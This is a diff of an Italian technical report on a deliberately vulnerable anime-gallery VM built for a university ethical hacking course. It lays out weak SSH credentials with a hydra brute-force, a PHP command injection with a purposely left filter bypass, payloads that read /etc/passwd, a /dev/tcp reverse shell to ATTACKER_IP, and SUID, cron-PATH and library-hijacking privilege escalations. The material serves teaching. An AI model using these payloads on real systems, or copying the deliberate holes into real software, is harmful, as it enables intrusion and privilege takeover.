@@ -3,21 +3,18 @@
 ## Progetto Accademico: Progettazione e Implementazione di un Ambiente Vulnerabile Controllato
 
 **Contexto del Progetto:**
-- **Ateneo:** Sapienza Università di Roma, Dipartimento di Cybersecurity
+- **Ateneo:** Sapienza Università di Roma, Corso di Laurea Magistrale in Cybersecurity
 - **Corso:** Ethical Hacking & Penetration Testing (A.A. 2023/24)
-- **Ruolo:** Lead Architect & Full-Stack Developer (6 vulnerabilità, 3 livelli di difficoltà)
 - **Target:** Progettazione di una macchina virtuale vulnerabile destinata a simulazioni didattiche in ambiente d'esame
 - **Deliverable:** VM Linux funzionante + Report tecnico ufficiale + Codice sorgente
 
-**Perché questo progetto è rilevante per la cybersecurity:**
-Gli studenti non dovevano solo trovare vulnerabilità: dovevano capire come combinarle, seguendo il path footprint → access → privilege escalation.
 
 **Tecnologie & Stack:**
 - **Sistema Operativo:** Ubuntu 20.04.6 LTS
 - **Web Stack:** Apache2 + PHP
 - **Backend Logic:** Bash scripting, C (compilazione di exploit)
 - **Vulnerabilità Implementate:** 6 distinte (3 Access Vectors, 3 Privilege Escalation), livelli Easy/Medium/Hard
-- **Infrastructure:** Git versioning per tracking di design decisions
+- **Infrastructure:** Git versioning per tracking
 
 ---
 
@@ -25,18 +22,18 @@ Gli studenti non dovevano solo trovare vulnerabilità: dovevano capire come comb
 
 ### 1.1 Come l'Abbiamo Pensata
 
-Abbiamo deciso di non fare il solito "Linux VM con 6 flag nascosti" banale. Volevamo qualcosa che:
+La VM doveva essere basata su un vero e plausibile server, quindi era necessario che:
 
-1. **Fosse realistica** – Una web gallery è qualcosa che studenti hanno veramente visto online, non un ambiente astratto
-2. **Avesse una trama** – Il tema anime non è casuale: il prof ama gli anime, quindi è venuto naturale. Ma importante: gli hint sono nella UI (tooltip sulle immagini), quindi per trovarli serve fare OSINT sul sito, non leggere il codice
-3. **Fosse progressivo** – Easy vulnerabilità per capire il flusso, Medium per imparare il bypass che funziona, Hard per chi ha capito bene
+1. **Fosse realistica** – Abbiamo deciso di ispirarci ad una web gallery di inizio 2000, poiché sembrava una soluzione ottimale per avere una tipologia di web app conosciuta e non eccessivamente complessa.
+2. **Avesse una trama** – Il tema anime è stato pensato sapendo che il prof. fosse un appassionato: inoltre, vi è una sorta di narrazione interna con vari easter egg ed indizi nascosti.
+3. **Fosse progressivo** – Vulnerabilità Easy per capire il flow, Medium per imparare il bypass per l'RCE, Hard per aver fatto una corretta enumerazione e bypass filtro per LFI.
 
 **La Scelta: Waifu Gallery**
-Una galleria di personaggi anime di metà 2000. Perché? Perché è credibile (quegli anni c'erano), è un web service che effettivamente è stata una cosa, e gli studenti sapevano già di cosa parlavamo. Non ti devi spiegare "cosa è una gallery", sai già che è un sito dove scrolli immagini.
+Una board di personaggi anime dagli anni '90 a metà 2000. Perché? Perché è credibile, è un web service che effettivamente è stata una cosa e continuano ad esistere ed essere frequentati, gli studenti sapevano già di cosa parlavamo e non vi era un'eccessiva macchinosità del servizio che avrebbe causato rallentamenti del flow inutili. 
 
 ### 1.2 Architettura: Dove Abbiamo Messo Cosa
 
-Ogni vulnerabilità doveva stare in un posto specifico del sistema. Così l'attaccante doveva muoversi in ordine:
+Ogni vulnerabilità doveva stare in un posto specifico del sistema, in modo da favorire un'esplorazione da parte dell'attaccante:
 
 | Componente | Cosa È | Dove Attaccare |
 |---|---|---|
@@ -62,8 +59,8 @@ Ogni vulnerabilità doveva stare in un posto specifico del sistema. Così l'atta
 | #  | Nome Vulnerabilità | Categoria | Difficoltà | Prerequisiti | Post-Exploitation |
 |----|----|---|---|---|---|
 | **3.1** | Weak SSH Credentials | Initial Access | ⭐ EASY | Nessuno (brute-force pubblico) | Shell utente `amogus` |
-| **3.2** | Web Command Injection | Lateral Escalation | ⭐⭐ MEDIUM | Accesso a web app (default) | RCE come www-data user |
-| **3.3** | File Upload + Shell Execution | RCE | ⭐⭐⭐ HARD | Riconoscimento pagina nascosta + upload bypass + esecuzione | Shell www-data + persistent backdoor |
+| **3.2** | Web Command Injection | RCE | ⭐⭐ MEDIUM | Accesso a web app (default) | RCE come www-data user |
+| **3.3** | File Upload + Shell Execution | LFI | ⭐⭐⭐ HARD | Riconoscimento pagina nascosta + upload bypass + esecuzione | Shell www-data + persistent backdoor |
 | **4.1** | SUID Binary Exploitation (hping3) | Privilege Escalation | ⭐ EASY | Shell utente non-root | Shell root immediata |
 | **4.2** | Insecure Cronjob PATH | Privilege Escalation | ⭐⭐ MEDIUM | Accesso utente + attesa timing | Shell root (da reverse shell) |
 | **4.3** | LD_LIBRARY_PATH Hijacking | Privilege Escalation | ⭐⭐⭐ HARD | SUID binary + writable library path + C compilation skills | Shell root |
@@ -71,33 +68,33 @@ Ogni vulnerabilità doveva stare in un posto specifico del sistema. Così l'atta
 ### 2.2 Attack Chain Visualization
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│ INITIAL ACCESS                                          │
-│ ├─ [3.1] SSH brute-force (amogus:sus1)      ← Easiest  │
-│ └─ [3.1] HTTP Reconnaissance → UI hints               │
-└────────────────────┬────────────────────────────────────┘
+┌────────────────────────────────────────────────────────┐
+│ INITIAL ACCESS                                         │
+│ ├─ [3.1] SSH brute-force (amogus:sus1)     ← Easiest   │
+│ └─ [3.1] HTTP Reconnaissance → UI hints                │
+└────────────────────┬───────────────────────────────────┘
                      │
                      ▼
-┌─────────────────────────────────────────────────────────┐
-│ LATERAL MOVEMENT / WEB RCE                              │
+┌────────────────────────────────────────────────────────┐
+│ LATERAL MOVEMENT / WEB RCE                             │
 │ ├─ [3.2] Command Injection via search bar  ← Via ;;##  │
 │ │         shell_exec() bypass                          │
-│ └─ [3.3] Hidden upload page (imposter.php)            │
+│ └─ [3.3] Hidden upload page (imposter.php)             │
 │          shell.php.jpg double extension bypass         │
-└────────────────────┬────────────────────────────────────┘
+└────────────────────┬───────────────────────────────────┘
                      │
                      ▼
-┌─────────────────────────────────────────────────────────┐
-│ PRIVILEGE ESCALATION (Choose One)                       │
-│ ├─ [4.1] SUID hping3 → /bin/sh -p         ← Simplest   │
+┌────────────────────────────────────────────────────────┐
+│ PRIVILEGE ESCALATION (Choose One)                      │
+│ ├─ [4.1] SUID hping3 → /bin/sh -p          ← Easy      │
 │ ├─ [4.2] Cronjob PATH manipulation                     │
-│ └─ [4.3] LD_LIBRARY_PATH hijacking        ← Complex    │
-└─────────────────────────────────────────────────────────┘
+│ └─ [4.3] LD_LIBRARY_PATH hijacking         ← Hard      │
+└────────────────────────────────────────────────────────┘
 ```
 
 **Chiave Didattica:**
 Ogni livello dimostra concetti reali riscontrati in engagement professionali:
-- **Easy:** Reconnaissance basica + weak credentials (es. Spring4Shell, ProxyLogon preliminary phases)
+- **Easy:** Reconnaissance basica + weak credentials + OSINT
 - **Medium:** Sanitizzazione insufficiente + misunderstanding di shell metacharacters
 - **Hard:** Understanding profondo di ELF loader + exploitation of complex privilege boundaries
 
@@ -112,10 +109,12 @@ In questa sezione vengono descritti i vettori di ingresso progettati e implement
 #### Setup
 L'utente `amogus` con password `sus1` è il primo indizio. Il nome è un riferimento ad Among Us (il gioco), che all'epoca era famoso nei nostri gruppi di studio. Sapevamo che gli altri studenti lo avrebbero riconosciuto.
 
-La password non è nella UI da nessuna parte, ma il nome sì: se apri il DevTools e ispezioni una qualunque immagine della gallery, vedi:
+La password non è nella UI da nessuna parte, ma il nome sì: aprendo il DevTool randomicamente una delle immagini sarà come segue:
 ```html
 <img src="..." title="amogus" ...>
 ```
+
+Inoltre, è presente un indizio visivo nascosto nella home page: viene scelta randomicamente un'immgine nella griglia tra le ultime righe, facendo hovering del puntatore, apparirà in trasparenza l'Ascii art di _Among Us_. L'indizio è stato messo per premiare la ricerca immagine per immagine, essendo inoltre la sua posizione randomica. 
 
 Quindi per risolvere questa vulnerabilità serve:
 1. Osservare la UI (aprire inspector del browser)
@@ -127,19 +126,19 @@ Quindi per risolvere questa vulnerabilità serve:
 # Reconnaissance: passa il mouse su un'immagine, vedi il tooltip
 # Oppure F12 → Inspector, cerca title attribute
 
-# Brute-force SSH
+# Brute-force SSH (o dictionary per soluzione quasi istantanea)
 hydra -l amogus -P wordlist.txt ssh://<vm_ip>
-# Oppure: ssh amogus@<vm_ip> con password "sus1"
+# In seguito: ssh amogus@<vm_ip> con password "sus1"
 ```
-
-È Easy perché non c'è logica nascosta: il nome è visibile in UI, la password è banale. L'unico sforzo è capire che vai su SSH, non sul web app.
+vai s
+È Easy perché non c'è logica nascosta: il nome è visibile in UI, la password è banale. L'unico "sforzo" è capire che devi usare SSH, anche perché nella web app non ci sono moduli di login o altro. Inoltre, *sus* è il termine più connesso ad _amogus_, quindi la creazione della wordlist è molto rapida.
 
 ### 3.2 Web Command Injection – Medium Mode
 
 #### La Vulnerabilità
-La search bar fa ricerca di immagini con `shell_exec("ls $image_folder$query*.jpg")`.Il filtro era blacklist-based: blocca bash, nc, wget, comandi specifici. Però abbiamo volutamente lasciato un buco.
+La search bar fa ricerca di immagini con `shell_exec("ls $image_folder$query*.jpg")`.Il filtro era blacklist-based: blocca `bash`, `nc`, `wget`, comandi specifici. Però abbiamo volutamente lasciato un buco.
 
-Se usi `;` o `#` direttamente, viene bloccato. MA se usi `;;` e `##`, il filtro le riconosce come "doppi" e le permette. Poi c'è un `str_replace()` che li converte in singoli:
+Se usi `;` o `#` direttamente, questi vengono bloccati. MA se usi `;;` o `##`, il filtro riconosce solo il primo tralasciando il secondo carattere permettendo l'injection del codice. Poi c'è un `str_replace()` che li converte in singoli (inserito per comodità nell'esecuzione del RCE, senza creare difficoltà artificiale):
 ```php
 if (strpos($query, ";;") !== false && strpos($query, "##") !== false) {
     $query = str_replace(";;", ";", $query);    // ;; -> ;
@@ -147,14 +146,14 @@ if (strpos($query, ";;") !== false && strpos($query, "##") !== false) {
 }
 ```
 
-Il problema: il controllo PRIMA della sostituzione. Quindi `;;ls /##` passa il filtro perché `;;` non è `;`, non viene bloccato.
+Il controllo avviene PRIMA della sostituzione. Quindi `;;ls /##` passa il filtro perché `;;` non è `;`, non viene bloccato. Fosse stato effettuato DOPO, sarebbe stato bloccato, cosa che avviene per tutte le altre tipologie di injection.
 
 #### Come Risolverla
 ```bash
 # Payload diretti
-;;ls /##            # Elenca root directory
+;;ls /##             # Elenca root directory
 ;;cat /etc/passwd##  # Legge file sensibili
-;;whoami##          # Vedi chi sei
+;;whoami##           # Vedi chi sei
 
 # Payload più complessi (reverse shell):
 ;;bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1##
@@ -239,8 +238,7 @@ La flag `-p` di `/bin/sh` è critica: "preserve mode". Senza, la shell droppa i 
 # Remove SUID
 chmod -s /usr/sbin/hping3
 
-# Oppure usare sudo con logging:
-# sudoers: amogus ALL=(root) NOPASSWD: /usr/sbin/hping3
+# Oppure usare sudo con logging
 ```
 
 ### 4.2 Cronjob PATH Hijacking – Medium
@@ -346,9 +344,9 @@ chmod 750 /home/developer/overwrite.sh
 ### 4.3 LD.SO Hijacking – Hard
 
 #### Come Funziona L'ELF Loader
-L'ELF loader (`ld.so`) risolve le librerie dinamiche che un programma ha bisogno al runtime. Segue un ordine di ricerca specifico:
+L'ELF loader (`ld.so`) risolve le librerie dinamiche che un programma necessita a runtime. Segue un ordine di ricerca specifico:
 
-```
+```bash
 1. LD_LIBRARY_PATH (variabile ambiente)
 2. /etc/ld.so.cache (cache compilata)
 3. /etc/ld.so.conf e /etc/ld.so.conf.d/ (config di sistema)
